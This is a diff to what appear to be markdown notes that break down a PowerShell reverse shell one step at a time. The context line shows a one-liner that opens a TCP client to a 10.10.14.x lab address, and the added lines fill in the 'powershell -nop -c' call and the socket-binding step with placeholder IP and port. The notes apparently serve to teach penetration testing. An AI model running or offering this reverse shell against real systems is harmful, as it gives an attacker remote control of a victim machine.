@@ -25,15 +25,15 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
 ### Calling Powershell
 ```powershell
-
+powershell -nop -c
 ```
 
 ###  Binding a Socket
 ```powershell
-
+"$client = New-Object System.Net.Sockets.TCPClient(<IP>, <PORT>);
 ```
 
-### Calling Powershell
+### Setting the Command Stream
 ```powershell
 
 ```
